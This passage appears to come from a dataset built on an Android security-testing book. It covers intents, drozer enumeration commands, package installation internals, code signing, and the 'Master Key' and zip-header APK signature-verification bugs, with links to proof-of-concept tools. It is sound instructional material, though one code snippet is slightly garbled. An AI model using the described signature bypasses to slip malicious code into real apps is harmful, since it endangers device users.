relevant information passed\nfrom the calling application to the desired application component and contains an action and data that is\nrelevant to the request being made. A simple example of an application sending a request to open a particular\nURL in a browser would look as follows in code:\nIntent intent = new Intent(Intent.ACTION_VIEW);\nintent.setData(Uri.parse(\"http://www.google.com\"));\nstartActivity(intent);\nThe preceding code creates a simple implicit intent to view a URL, and the startActivity() function is called\nwith the intent as a parameter. Any application’s activity that is able to respond to a VIEW action on data that is\nformatted like a URL will be eligible to receive this intent. If only a single application can handle this intent, the\nintent is routed to that application by default. Otherwise, an application picker is shown. An application defines\n“intent filters” in its manifest, which catches the intents that are appropriate for its components. For example, if\nan activity in your application can handle HTTP links to websites, then an appropriate intent filter looks as\nfollows:\n<activity android:name=\"MyBrowserActivity\">\n<intent-filter>\n<action android:name=\"android.intent.action.VIEW\"/>\n<data android:scheme=\"http\" />\n</intent-filter>\n</activity>\nThis snippet states that the activity named MyBrowserActivity in this application can handle any intent with an\naction of android.intent.action.VIEW and has the data scheme of http://.\nIf you want to make sure that an intent that you send always reaches an application you intend and would not\nlike the system to decide, then you can make use of explicit intents. Explicit intents specify the application and\ncomponent that the intent should be delivered to. For example, if an application you created needs to explicitly\nopen a URL in the Android browser application, you use the following code:\nIntent intent = new Intent(Intent.ACTION_VIEW);\nintent.setData(Uri.parse(\"http://www.google.com\"));\nString pack = \"com.android.browser\";\nComponentName comp = new ComponentName(pack, pack + \".BrowserActivity\");\nintent.setComponent(comp);\nstartActivity(intent);\nYou can try this from drozer without having to create a test application as follows:\ndz> run app.activity.start --action android.intent.action.VIEW --data-uri\nhttp://www.google.com --component com.android.browser\ncom.android.browser.BrowserActivity\ndrozer can be used to interact with all application components in the same easy manner. The following is an\nexample of querying the system settings content provider from drozer that can be queried from any application:\ndz> run app.provider.query content://settings/system\n| _id | name | value |\n| 1 | volume_music | 11 |\n| 2 | volume_ring | 5 |\n| 3 | volume_system | 7 |\n| 4 | volume_voice | 4 |\n| 5 | volume_alarm | 6 |\n| 6 | volume_notification | 5 |\n| 7 | volume_bluetooth_sco | 7 |\n| 9 | mute_streams_affected | 46 |\n| 10 | vibrate_when_ringing | 0 |\n| 11 | dim_screen | 1 |\n| 12 | screen_off_timeout | 60000 |\n| 13 | dtmf_tone_type | 0 |\n| 14 | hearing_aid | 0 |\n| 15 | tty_mode | 0 |\n| 16 | screen_brightness | 102 |\n| 17 | screen_brightness_mode | 0 |\n| 18 | window_animation_scale | 1.0 |\n| 19 | transition_animation_scale | 1.0 |\n| 20 | accelerometer_rotation | 1 |\n| 21 | haptic_feedback_enabled | 1 |\n| 22 | notification_light_pulse | 1 |\n| 23 | dtmf_tone | 1 |\n| 24 | sound_effects_enabled | 1 |\n| 26 | lockscreen_sounds_enabled | 1 |\n| 27 | pointer_speed | 0 |\n| 28 | mode_ringer_streams_affected | 422 |\n| 29 | media_button_receiver |\ncom.android.music/com.android.music.MediaButtonIntentReceiver |\n| 30 | next_alarm_formatted | |\nChapter 7 shows many more examples of interacting with components using drozer. The ability to find\nvulnerabilities in application components requires a thorough understanding of their features and how they can\nbe invoked.\nLooking Under the Hood\nThis section explores the finer details of what happens under the hood when installing and running an\napplication.\nInstalling an Application\nWhen an application is installed on an Android device, various tasks must be performed by the Package\nManager Service and installd to ensure that the OS fully recognizes and knows how to work with it. The\nfollowing is a high-level view of the steps:\nDetermine correct installation location according to package parameters\nDetermine if this is a new installation or update\nStore the APK in the appropriate directory\nDetermine the application’s UID\nCreate the application data directory and set the appropriate permissions\nExtract native libraries and place them in libs directory of application data directory and set appropriate file\nand folder permissions\nExtract the DEX file from the package and put its optimized equivalent in the cache directory\nAdd package particulars to packages.list and packages.xml\nSend a broadcast stating that the package was installed\nThis installation process was documented in depth by Ketan Parmar in a blog post at\nhttp://www.kpbird.com/2012/10/in-depth-android-package-manager-and.html#more. For the purposes of the\nnext discussion, one of the most important points to take away from the previous list is that when an Android\npackage is installed, it is also stored on the device. User-level applications are stored in /data/app/, and\napplications that came with the system image are under /system/app/.\nNOTE\nSince Android 4.4 (KitKat), applications that request to be run as the system user have to be installed in\n/system/priv-app/, otherwise the OS will reject this request. Prior to Android 4.4, any application that was\nlocated in /system/app could be granted this right. This change allows device manufacturers a greater\ndegree of control over the security of the applications they bundle with their devices.\nHere is an example listing of all the APK files present in the /data/app/ folder on an Android 4.4 emulator:\nroot@android:/data/app # ls -l *.apk\n-rw-r--r-- system system ... ApiDemos.apk\n-rw-r--r-- system system ... CubeLiveWallpapers.apk\n-rw-r--r-- system system ... GestureBuilder.apk\n-rw-r--r-- system system ... SmokeTest.apk\n-rw-r--r-- system system ... SmokeTestApp.apk\n-rw-r--r-- system system ... SoftKeyboard.apk\n-rw-r--r-- system system ... WidgetPreview.apk\nAn important point to note is that each of the APK files listed is world readable according to their file\npermissions. This is the reason downloading them off a device or accessing them without having any particular\nlevel of privileges is possible. These same permissions are set on packages stored in the /system/app and\n/system/priv-app folders.\nThe Play Store used to have a Copy Protection function that you could enable when publishing an application.\nApplications that have been installed with this deprecated option reside in /data/app-private/ and are marked\nwith the following file permissions, which do not allow world read access like the other third-party and system\napplications:\nshell@android:/data/app-private # ls -l -a\n-rw-r----- system app_132 629950 2014-04-18 23:40 com.mwr.dz-1.apk\nThese applications have essentially been installed using the FORWARD_LOCK option provided by the Package\nManager. You can replicate this installation option by using the following command from an ADB shell on your\ndevice:\nshell@android:/data/local/tmp $ pm install -l agent.apk\nThis installs the package with FORWARD_LOCK enabled, which places its APK in the /data/app-private folder. It\nshould be noted here that this form of “copy protection” is fundamentally broken and relies on users not having\nprivileged access on their device. If users have privileged access they can retrieve the application and\nredistribute it by other means and install it on other devices without this mechanism having any bearing.\nNOTE\nAs of Android 4.1 (Jelly Bean), applications that are installed with this option are stored with the extension\n.asec in the /data/app-asec folder and encrypted with a device-specific key, which is stored in\n/data/misc/systemkeys/AppsOnSD .sks. The file permissions are set so that it can only be accessed by\nprivileged users on the device (such as system and root). Initially, this feature was controversial and broke\napplication features but has since been resolved in the 4.1.2 update. Nikolay Elenkov described this\nexcellently in a blog post, which you can find at http://nelenkov.blogspot.com/2012/07/using-app-\nencryption-in-jelly-bean.html.\nUpon installing an application, in addition to storing the APK on disk, the application attributes are cataloged in\nfiles located at /data/system/packages.xml and /data/system/packages.list. These files contain a list of all\ninstalled applications as well as other information important to the package. The packages.xml file stores\ninformation about each installed application, including the permissions that were requested. This means that\nany changes made inside this file will directly affect the way that the OS treats the application. For instance,\nediting this file and adding or removing a permission from an application literally changes the application’s\npermissions. This fact may be used by application testers on Android to manipulate packages into a desirable\nstate for testing or modification. It has also been used by Android “tinkerers” to build toolkits that allow for the\n“revocation” of permissions on chosen applications. This, of course, requires privileged access on the device\nbecause of the allocated file permissions on packages.xml, which is shown here:\nroot@android:/ # ls -l /data/system/packages.xml\n-rw-rw----- system system 57005 2014-04-18 21:38 packages.xml\nNOTE\nOn versions of Android prior to and including 4.0.4 (Ice Cream Sandwich) the packages.xml and\npackages.list files were marked as world readable. This can be confirmed by observing the ICS Android\nsource code and comparing the file permission assignments by tracing the mSettingsFilename and\nmPackageListFilename variables over the different versions of Android. You can efficiently perform code\ncomparisons of this nature at http://grepcode.com/\nfile/repository.grepcode.com/java/ext/com.google.android/android/4.0.4_r2.1/com/android/server/pm/Settings.java/\nAnother procedure that takes place at installation time is the optimization and caching of the package’s DEX\nfile. The classes.dex file is extracted from the APK, optimized using the dexopt utility, and then stored in the\nDalvik cache folder. This folder exists at $ANDROID_DATA/dalvik-cache on every device (which is normally\n/data/dalvik-cache). It is optimized so that minimal instruction checking needs to be performed at runtime,\nand other such pre-execution checks can be performed on the bytecode. For more information about the specific\ntasks run by dexopt go to https://cells-\nsource.cs.columbia.edu/plugins/gitiles/platform/dalvik/+/android-4.3_r0.9/docs/dexopt.html. The\nprocess of creating an ODEX may take time, and this could degrade first-run performance for applications. This\nis why most system applications on an Android image come pre-”odexed,” or a process of odexing is performed\non first startup of the OS. If you explore the filesystem, notice that APKs in the /system/app directory may have\nan accompanying file with the same name and an extension of .odex. These are the application’s “optimized\nDEX” files that are stored outside of the package archive.\nPre-optimizing the DEX files means that when applications are run they do not need to be processed and stored\nin the cache first, which improves the loading time of the application. The processing procedure used by the\ndexopt utility for converting a DEX to an ODEX is a complex one. It involves parsing each instruction and\nchecking for redundancies that can be replaced and using inline native replacements for methods that are called\nfrequently. This process makes these ODEX files highly dependent on the specific version of the VM in use on\nthe device. As a consequence, it is unlikely that an ODEX file will work on another device, unless the device\nsoftware type and versions are identical.\nRunning an Application\nAndroid uses an unusual procedure for starting new applications. It works by having a single application VM\nstarted when the OS boots that listens for requests to launch new applications. When it receives a request, it\nsimply fork()’s itself with new application parameters and code to run. The process that listens for new\napplication requests is aptly named zygote. This technique makes the process of creating new application VMs\nefficient, as core libraries are shared between VMs. When a user clicks on an application icon, an intent is\nformulated and sent using startActivity(). This is handled by the Activity Manager Service, which sends a\nmessage to zygote with all the parameters required to start the application. Zygote listens on a UNIX socket\nlocated at /dev/socket/zygote and has the following permissions, which allow only the system UID or root to\ninteract with it:\nroot@android:/ # ls -l /dev/socket/zygote\nsrw-rw---- root system 2014-05-04 11:05 zygote\nWhen an application is started, the Dalvik cache is checked to see whether the application’s DEX file has been\noptimized and stored. If it has not, the system has to perform this optimization, which impacts the application’s\nloading time.",
    "question": "What are the key differences between the Android emulator and a physical Android device that a tester should be aware of when performing security assessments?",
    "summary": "This chapter explains the Android OS and its application structure, focusing on security aspects and tools for analyzing and testing Android applications. It covers setting up an Android testing environment, using the Android SDK tools like ADB, and discusses the differences between emulators and physical devices. The chapter also introduces Android application components, their roles, and how they interact through intents and the binder IPC system, along with tools like drozer for security testing and exploring the OS's internal workings."
  },
  {
    "start": 33,
    "end": 35,
    "text": "ART—RUNTIME REPLACEMENT FOR DALVIK\nAndroid 5.0 (Lollipop) makes use of a new runtime named ART (Android Runtime) by default. It was\ndesigned to make applications perform better on the platform and reduce battery consumption. An\nexperimental version of ART was included in Android 4.4 (KitKat) and could be enabled by going to\nSettings ➪ Developer Options ➪ Select Runtime. (See Figure 6.7.)\nMaking use of ART instead of Dalvik should be completely transparent to average users of the OS, but\nmarks a significant technical change. Dalvik interprets code at runtime using a Just-in-Time (JIT)\napproach, which compiles bytecode to native code on the fly. This compilation introduces a delay and\nadditional computing resources. ART’s new Ahead-Of-Time (AOT) compilation converts applications to\nnative code directly at installation time. This process takes a bit longer than its Dalvik counterpart and\ntakes up more disk space; however, the aim is to improve application load times and responsiveness. This\nis achieved by having it stored as native code that at runtime does not need to be interpreted. At the time\nof writing, benchmarks performed provided mixed results. Some applications performed better using ART\nand others did not. It is suspected that Google will be constantly looking to improve the performance of\napplications running on ART and the common consensus is that moving away from the Dalvik runtime is\nthe right decision.\nART makes use of OAT files instead of DEX files as the stored executable format. On devices that have the\noption to make use of ART, there is a utility included on the system image that allows for conversion from\nthe DEX to OAT format. It is called dex2oat. Rudimentary reverse engineering tools for OAT will be\npresented later in this chapter in “Reverse Engineering Applications.”\nFigure 6.7 The runtime selection activity available on Android 4.4\nUnderstanding the Security Model\nThe foundation of the Android application security model is that no two applications running on the same\ndevice should be able to access each other’s data without authorization. They should also not be able to affect\nthe operation of the other application adversely or without the appropriate consent. This concept is the basis of\nan application sandbox.\nIn theory, this concept is simple but the practical implementation of what defines an authorized action or not is\ncomplex. Keeping an open and extendible environment while maintaining security means that the security\nmodel has to stretch further than just the application code itself. An application would need to know whether\nanother application is authorized to perform an action and so the concept of application identity is important.\nAndroid has built-in ways of checking which entity created an application, and using this information could\ndetermine what privilege context it can be assigned on the device. After all, if any application author could claim\nto be Google, enforcing any trust boundaries would not be possible and every application would have to be\nafforded the same level of trust on the device. An application author’s identity is managed by code signing.\nCode Signing\nThe signing of an Android package is done cryptographically through the use of digital certificates whose private\nkey is only held by the application developers. Code signing is used to prove the identity of an application’s\nauthor in order to designate a degree of trust to it in other aspects of the security model. Signing of a package is\nmandatory, even if the certificate used is the default debug certificate that can only be used during development.\nTo generate your own X.509 certificate that can be used for signing, use the following command:\n$ keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA\n-keysize 2048 -validity 10000\nSigning your unsigned application can be performed using the following command, making use of your newly\ncreated certificate:\n$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore\nmykey.keystore application.apk alias_name\nThe certificate information of an application is contained within the CERT.RSA file in the META-INF folder inside\nevery Android package.\nTIP\nRemember that an APK is simply a Zip archive that you can unzip using your favorite application.\nYou can view the certificate using any tool capable of parsing the DER format. Here is an example of using\nopenssl to display the certificate and its attributes:\n$ openssl pkcs7 -inform DER -in CERT.RSA -text -print_certs\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number: 10623618503190643167 (0x936eacbe07f201df)\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=US, ST=California, L=Mountain View, O=Android,\nOU=Android, CN=Android/emailAddress=android@android.com\nValidity\nNot Before: Feb 29 01:33:46 2008 GMT\nNot After : Jul 17 01:33:46 2035 GMT\nSubject: C=US, ST=California, L=Mountain View, O=Android,\nOU=Android, CN=Android/emailAddress=android@android.com\nSubject Public Key Info:\nPublic Key Algorithm: rsaEncryption\nPublic-Key: (2048 bit)\nModulus:\n00:d6:93:19:04:de:c6:0b:24:b1:ed:c7:62:e0:d9:\nd8:25:3e:3e:cd:6c:eb:1d:e2:ff:06:8c:a8:e8:bc:\na8:cd:6b:d3:78:6e:a7:0a:a7:6c:e6:0e:bb:0f:99:\n35:59:ff:d9:3e:77:a9:43:e7:e8:3d:4b:64:b8:e4:\nfe:a2:d3:e6:56:f1:e2:67:a8:1b:bf:b2:30:b5:78:\nc2:04:43:be:4c:72:18:b8:46:f5:21:15:86:f0:38:\na1:4e:89:c2:be:38:7f:8e:be:cf:8f:ca:c3:da:1e:\ne3:30:c9:ea:93:d0:a7:c3:dc:4a:f3:50:22:0d:50:\n08:07:32:e0:80:97:17:ee:6a:05:33:59:e6:a6:94:\nec:2c:b3:f2:84:a0:a4:66:c8:7a:94:d8:3b:31:09:\n3a:67:37:2e:2f:64:12:c0:6e:6d:42:f1:58:18:df:\nfe:03:81:cc:0c:d4:44:da:6c:dd:c3:b8:24:58:19:\n48:01:b3:25:64:13:4f:bf:de:98:c9:28:77:48:db:\nf5:67:6a:54:0d:81:54:c8:bb:ca:07:b9:e2:47:55:\n33:11:c4:6b:9a:f7:6f:de:ec:cc:8e:69:e7:c8:a2:\nd0:8e:78:26:20:94:3f:99:72:7d:3c:04:fe:72:99:\n1d:99:df:9b:ae:38:a0:b2:17:7f:a3:1d:5b:6a:fe:\ne9:1f\nExponent: 3 (0x3)\nX509v3 extensions:\nX509v3 Subject Key Identifier:\n48:59:00:56:3D:27:2C:46:AE:11:86:05:A4:74:19:AC:09:CA:8C:11\nX509v3 Authority Key Identifier:\nkeyid:48:59:00:56:3D:27:2C:46:AE:11:86:05:A4:74:19:AC:09:CA:8C:11\nDirName:/C=US/ST=California/L=Mountain\nView/O=Android/OU=Android/CN=Android/emailAddress=android@android.com\nserial:93:6E:AC:BE:07:F2:01:DF\nX509v3 Basic Constraints:\nCA:TRUE\nSignature Algorithm: sha1WithRSAEncryption\n7a:af:96:8c:eb:50:c4:41:05:51:18:d0:da:ab:af:01:5b:8a:\n76:5a:27:a7:15:a2:c2:b4:4f:22:14:15:ff:da:ce:03:09:5a:\nbf:a4:2d:f7:07:08:72:6c:20:69:e5:c3:6e:dd:ae:04:00:be:\n29:45:2c:08:4b:c2:7e:b6:a1:7e:ac:9d:be:18:2c:20:4e:b1:\n53:11:f4:55:d8:24:b6:56:db:e4:dc:22:40:91:2d:75:86:fe:\n88:95:1d:01:a8:fe:b5:ae:5a:42:60:53:5d:f8:34:31:05:24:\n22:46:8c:36:e2:2c:2a:5e:f9:94:d6:1d:d7:30:6a:e4:c9:f6:\n95:1b:a3:c1:2f:1d:19:14:dd:c6:1f:1a:62:da:2d:f8:27:f6:\n03:fe:a5:60:3b:2c:54:0d:bd:7c:01:9c:36:ba:b2:9a:42:71:\nc1:17:df:52:3c:db:c5:f3:81:7a:49:e0:ef:a6:0c:bd:7f:74:\n17:7e:7a:4f:19:3d:43:f4:22:07:72:66:6e:4c:4d:83:e1:bd:\n5a:86:08:7c:f3:4f:2d:ec:21:e2:45:ca:6c:2b:b0:16:e6:83:\n63:80:50:d2:c4:30:ee:a7:c2:6a:1c:49:d3:76:0a:58:ab:7f:\n1a:82:cc:93:8b:48:31:38:43:24:bd:04:01:fa:12:16:3a:50:\n57:0e:68:4d\n-----BEGIN CERTIFICATE-----\nMIIEqDCCA5CgAwIBAgIJAJNurL4H8gHfMA0GCSqGSIb3DQEBBQUAMIGUMQswCQYD\nVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4g\nVmlldzEQMA4GA1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UE\nAxMHQW5kcm9pZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTAe\nFw0wODAyMjkwMTMzNDZaFw0zNTA3MTcwMTMzNDZaMIGUMQswCQYDVQQGEwJVUzET\nMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4G\nA1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9p\nZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTCCASAwDQYJKoZI\nhvcNAQEBBQADggENADCCAQgCggEBANaTGQTexgskse3HYuDZ2CU+Ps1s6x3i/waM\nqOi8qM1r03hupwqnbOYOuw+ZNVn/2T53qUPn6D1LZLjk/qLT5lbx4meoG7+yMLV4\nwgRDvkxyGLhG9SEVhvA4oU6Jwr44f46+z4/Kw9oe4zDJ6pPQp8PcSvNQIg1QCAcy\n4ICXF+5qBTNZ5qaU7Cyz8oSgpGbIepTYOzEJOmc3Li9kEsBubULxWBjf/gOBzAzU\nRNps3cO4JFgZSAGzJWQTT7/emMkod0jb9WdqVA2BVMi7yge54kdVMxHEa5r3b97s\nzI5p58ii0I54JiCUP5lyfTwE/nKZHZnfm644oLIXf6MdW2r+6R8CAQOjgfwwgfkw\nHQYDVR0OBBYEFEhZAFY9JyxGrhGGBaR0GawJyowRMIHJBgNVHSMEgcEwgb6AFEhZ\nAFY9JyxGrhGGBaR0GawJyowRoYGapIGXMIGUMQswCQYDVQQGEwJVUzETMBEGA1UE\nCBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4GA1UEChMH\nQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9pZDEiMCAG\nCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbYIJAJNurL4H8gHfMAwGA1Ud\nEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAHqvlozrUMRBBVEY0NqrrwFbinZa\nJ6cVosK0TyIUFf/azgMJWr+kLfcHCHJsIGnlw27drgQAvilFLAhLwn62oX6snb4Y\nLCBOsVMR9FXYJLZW2+TcIkCRLXWG/oiVHQGo/rWuWkJgU134NDEFJCJGjDbiLCpe\n+ZTWHdcwauTJ9pUbo8EvHRkU3cYfGmLaLfgn9gP+pWA7LFQNvXwBnDa6sppCccEX\n31I828XzgXpJ4O+mDL1/dBd+ek8ZPUP0IgdyZm5MTYPhvVqGCHzzTy3sIeJFymwr\nsBbmg2OAUNLEMO6nwmocSdN2ClirfxqCzJOLSDE4QyS9BAH6EhY6UFcOaE0=\n-----END CERTIFICATE-----\nYou can also use the Java keytool utility with the following parameters:\n$ keytool -printcert -file CERT.RSA\nApplication certificates are not verified by the Android operating system in any way and do not need to be issued\nby a certain Certificate Authority (CA) like other platforms. In fact, the majority of applications make use of a\nself-signed signing certificate and the OS does not check this certificate against any stored or online repository.\nThe signing certificate is checked only when the application gets installed and if the certificate subsequently\nexpires, the application will still run as normal. Google recommends that signing certificates be created with a\nvalidity period of 25 years or longer to support seamless updates to your application (see\nhttp://developer.android.com/tools/publishing/app-signing.html#considerations). Google Play enforces\nthat the expiration on the signing certificate used to sign published applications is after October 22, 2033. This\nagain is to support updates to your application.\nWith all the preceding information at hand, one can observe that the Android OS does not follow a conventional\nPublic Key Infrastructure (PKI) process. It does not query any infrastructure to check the authenticity of an\nauthor’s claimed identity. This does not mean that the model is flawed in any way, it is simply different.\nCertificates are used for doing comparisons against other applications claiming to be written by the same author\nin order to establish trust relationships as well as for accepting application updates. This security model depends\nhighly on the operating system’s ability to compare these application certificates and deny forged applications\nthe associated privilege of a certain certificate. This chapter provides more concrete examples later when the\npermission model is introduced and protection levels are discussed. As noted by Nikolay Elenkov in a blog post\nat http://nelenkov.blogspot.com/2013/05/code-signing-in-androids-security-model.html, the certificate\ncheck is a literal binary comparison of the two certificates being compared. The function that handles this check\nis in /core/java/android/content/pm/Signature.java of the Android source tree, and the specific check is\nhighlighted in the code:\n@Override\npublic boolean equals(Object obj) {\ntry {\nif (obj != null) {\nSignature other = (Signature)obj;\nreturn this == otherǁ Arrays.equals(mSignature,\nother.mSignature\n}\n} catch (ClassCastException e) {\n}\nreturn false;\n}\nThis means that issuing an update for your application is only possible if it has been signed with exactly the\nsame certificate. If a developer loses his signing certificate, he can no longer issue updates to his users. Instead,\nhe would have to publish their latest application update as a new application that has been signed with their\nnew certificate. This means that users would have to re-download the newly published application as if it were a\nnew application altogether. This speaks to the importance of keeping your signing certificate safe and backed up\nappropriately.\nFor the official Android Developer documentation from which some of this information has been taken, please\nvisit http://developer.android.com/tools/publishing/app-signing.html.\nDiscovered Vulnerabilities\nA number of vulnerabilities have been discovered in the way that the validation of signatures is performed on\nAPK files. The presented vulnerabilities affect devices up to and including Android 4.3.\nGoogle Bug #8219321—”Master Key” Vulnerability\nIn February 2013, Bluebox Security discovered the first vulnerability in the way that Android application\ncontents are cryptographically verified. This is commonly known as the “Master Key” vulnerability. The\ndiscovered bug allowed for the arbitrary modification of an APK file without invalidating the cryptographic\nsignature.\nThe vulnerability was that if a duplicate filename occurred in the zip archive, only the first file entry’s hash was\nchecked. The MANIFEST.MF file included in each APK contains all the hashes of each file present in the rest of the\narchive. Here is an example:\n$ cat META-INF/MANIFEST.MF\nManifest-Version: 1.0\nCreated-By: 1.0 (Android SignApk)\nName: res/layout-land/activity_main.xml\nSHA1-Digest: tHBSzedjV31QNPH6RbNFbk5BW0g=\nName: res/drawable-xhdpi/ic_launcher.png\nSHA1-Digest: itzF8BBhIB+iXXF/RtrTdHKjd0A=\n...\nName: AndroidManifest.xml\nSHA1-Digest: HoN6bMMe9RH6KHGajGz3Bn/fWWQ=\n...\nName: classes.dex\nSHA1-Digest: 6R7zbiNfV8Uxty8bvi4VHpB7A8I=\n...\nHowever, it is possible in the zip format to include two files with the same name. This bug exploits the fact that\nthe hash of the first file is checked in Java code, but then the second file with the same name ends up being\nused by the C++ implementation when deployed to the device. This means that the second file can contain\ncompletely new contents and the validation of the APK still passes all checks. This vulnerability makes taking a\nlegitimate application and including malicious code without breaking the signature possible. This vulnerability\ncan also be used to gain system (and sometimes root) access on a device by modifying and reinstalling a system\napplication. This use case is explained later in this chapter in “Root Explained”.\nA basic proof of concept was created by Pau Oliva to demonstrate how simple the process is to repackage an APK\nwith modified code without breaking the signature. You can find it at\nhttps://gist.github.com/poliva/36b0795ab79ad6f14fd8. A more comprehensive tool that exploits this issue\nand other discovered code signing vulnerabilities was written by Ryan Welton and is at\nhttps://github.com/Fuzion24/AndroidZipArbitrage/.\nGoogle Bug #9695860\nJust two days after bug #8219321 was revealed, a patch was committed (see\nhttps://android.googlesource.com/platform/libcore/+/9edf43dfcc35c761d97eb9156ac4254152ddbc55%5E%21/)\nthat revealed another way that could be used to manipulate an APK to the same effect as the Master Key bug.\nThis time, the vulnerability existed in the way that the length of the “extra” field in the local file headers of an\nentry in the zip archive was calculated in code. Figure 6.8 shows a simplified view of a zip archive containing a\nsingle file.\nFigure 6.8 The simplified structure of a zip file containing a single file entry.\nThe format provides for a 16-bit length “extra” field, but in the Java code the length was read as a signed 16-bit\nnumber. This meant that overflowing this value into a negative length was possible. Exploitation techniques\npresented by the community were quite involved but putting it simply, the discrepancy between how the Java\nand C++ implementation parsed these values allowed for the injection of altered files that passed the signature\nvalidation. Jay Freeman covers various exploitation techniques in detail at http://www.saurik.com/id/18.\nGoogle Bug #9950697\nIn July 2013, another vulnerability affecting signature verification of packages was patched by Google. To find\nthe exact commit go to\nhttps://android.googlesource.com/platform/libcore/+/2da1bf57a6631f1cbd47cdd7692ba8743c993ad9%5E%21/.\nThe length of the “name” field in the local file headers of an entry in the zip file was found to not be checked by\nthe Java verification code. Rather, this length was calculated from another place in the zip file, known as the\n“central directory.” This can be exploited by setting a large “name” value in the local file header, which is not\nchecked by the Java implementation, and putting the correct “name” in the “central directory.” The C++ code\nchecks the local file header and executes code that is appended. However, the Java code verifies the signature of\nthe entry according to the length of the “name” in the “central directory.” Building an archive with entries that\nsatisfy both conditions and allow for the execution of arbitrary code while maintaining the signatures of the files\nin the package is therefore possible. Once again, Jay Freeman provides an excellent in-depth write-up of this\nissue at http://www.saurik.com/id/19.\nUnderstanding Permissions\nImagine if every application you have installed on your device could access your contacts, SMS messages, GPS\nlocation, or any other information. This would be a scary prospect in a world where the average Android user\nhas 26 or more applications installed (according to http://www.statista.com/topics/1002/mobile-app-\nusage/chart/1435/top-10-countries-by-app-usage/). This section will discuss how Android implements its\npermission model and assigns applications the rights to request access to device resources.\nInspecting the Android Permission Model\nAndroid employs a fine-grained privilege model for applications. Applications have to request “permission” to\naccess certain information and resources on a device. A user who installs an application from the Play Store is\npresented with an activity displaying the types of information and hardware that the application can access on\nyour device. However, this information is abstracted away from the technical details in newer versions of the\nPlay Store and does not display the details of the actual permission requested. Figure 6.9 shows an example of\nclicking the “Permission details” option in the Play Store on the Twitter (https://twitter.com/) application.\nFigure 6.9 The required permissions displayed when looking at the permission details on the Twitter\napplication.\nEach defined permission has a unique name that is used when referring to it in code as well as a friendly label\nand a more verbose description about what it is for. This means that when an application permission activity\nshows “Read your text messages (SMS or MMS)” that it actually translates back to the permission with the\nname android.permission.READ_SMS. If you examine the AndroidManifest .xml file associated with an\napplication, notice the XML describing the defined and requested permissions respectively as <permission> and\n<uses-permission> tags.\nIn drozer, to find the permissions that have been requested and defined by a certain application, run the\napp.package.info module with the package name as the argument (in this case the Android browser):\ndz> run app.package.info -a com.android.browser\nPackage: com.android.browser\nApplication Label: Browser\nProcess Name: com.android.browser\nVersion: 4.4.2-938007\nData Directory: /data/data/com.android.browser\nAPK Path: /system/app/Browser.apk\nUID: 10014\nGID: [3003, 1028, 1015]\nShared Libraries: null\nShared User ID: null\nUses Permissions:\n- android.permission.ACCESS_COARSE_LOCATION\n- android.permission.ACCESS_DOWNLOAD_MANAGER\n- android.permission.ACCESS_FINE_LOCATION\n- android.permission.ACCESS_NETWORK_STATE\n- android.permission.ACCESS_WIFI_STATE\n- android.permission.GET_ACCOUNTS\n- android.permission.USE_CREDENTIALS\n- android.permission.INTERNET\n- android.permission.NFC\n- android.permission.SEND_DOWNLOAD_COMPLETED_INTENTS\n- android.permission.SET_WALLPAPER\n- android.permission.WAKE_LOCK\n- android.permission.WRITE_EXTERNAL_STORAGE\n- android.permission.WRITE_SETTINGS\n- android.permission.READ_SYNC_SETTINGS\n- android.permission.WRITE_SYNC_SETTINGS\n- android.permission.MANAGE_ACCOUNTS\n- android.permission.READ_PROFILE\n- android.permission.READ_CONTACTS\n- com.android.browser.permission.READ_HISTORY_BOOKMARKS\n- com.android.browser.permission.WRITE_HISTORY_BOOKMARKS\n- com.android.launcher.permission.INSTALL_SHORTCUT\n- android.permission.READ_EXTERNAL_STORAGE\nDefines Permissions:\n- com.android.browser.permission.PRELOAD\nSearching for applications that have requested a particular permission using the permission filter is also\npossible. For verbose package information, make use of the app.package.info module or for a short list, use\napp.package.list in the following manner, providing the permission of interest as a parameter:\ndz> run app.package.list -p android.permission.READ_SMS\ncom.android.phone (Phone)\ncom.android.mms (Messaging)\ncom.android.gallery (Camera)\ncom.android.camera (Camera)\nRequesting certain permissions may cause the application’s user identifier to be added to a Linux group. For\ninstance, requesting the permission android.permission.INTERNET puts the application in the inet group. This\nmapping is shown here:\n<permission name=\"android.permission.INTERNET\" >\n<group gid=\"inet\" />\n</permission>\nThese mappings are defined in /system/etc/permissions/platform.xml. Other permissions may not equate to\nany group amendments being made and are simply a form of access control. For instance, the READ_SMS\npermission does not allow the application to read the SMS database directly, but rather allows it to query\ncontent://sms and other related content providers. The following drozer command allows a user to query which\ncontent providers require the READ_SMS permission:\ndz> run app.provider.info -p android.permission.READ_SMS\nPackage: com.android.mms\nAuthority: com.android.mms.SuggestionsProvider\nRead Permission: android.permission.READ_SMS\nWrite Permission: null\nContent Provider: com.android.mms.SuggestionsProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nPath Permissions:\nPath: /search_suggest_query\nType: PATTERN_PREFIX\nRead Permission: android.permission.GLOBAL_SEARCH\nWrite Permission: null\nPath: /search_suggest_shortcut\nType: PATTERN_PREFIX\nRead Permission: android.permission.GLOBAL_SEARCH\nWrite Permission: null\nPackage: com.android.providers.telephony\nAuthority: mms\nRead Permission: android.permission.READ_SMS\nWrite Permission: android.permission.WRITE_SMS\nContent Provider: com.android.providers.telephony.MmsProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: True\nUri Permission Patterns:\nPath: /part/\nType: PATTERN_PREFIX\nPath: /drm/\nType: PATTERN_PREFIX\nAuthority: 